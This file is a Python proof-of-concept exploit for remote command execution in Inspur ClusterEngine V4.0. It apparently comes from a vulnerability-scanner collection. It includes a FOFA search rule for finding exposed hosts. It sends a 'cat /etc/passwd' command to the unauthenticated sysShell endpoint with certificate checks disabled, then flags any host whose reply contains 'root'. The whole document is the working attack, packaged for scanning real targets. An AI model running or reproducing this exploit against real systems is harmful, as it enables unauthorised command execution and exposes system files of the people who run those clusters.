#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
from requests.packages.urllib3.exceptions import InsecurePlatformWarning


# 脚本信息
######################################################
NAME='Inspur_sysShell_RCE'
AUTHOR="Faith"
REMARK='浪潮ClusterEngineV4.0 sysShell RCE'
FOFA_RULE='title="TSCEV4.0"'
######################################################

def poc(target):
    result = {}
    url = target + "/sysShell"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie": "lang=cn"
    }
    data = "op=doPlease&node=cu01&command=cat /etc/passwd"
    try:
        requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)
        r = requests.post(url=url,headers=headers,data=data,verify=False,timeout=3)
        if 'root' in r.text and r.status_code ==200:
            result['target'] = target
            result['poc'] = NAME
            result['url'] = url
            return result
        else:
            pass
    except:
        pass
if __name__ == '__main__':
    poc("https://127.0.0.1/")

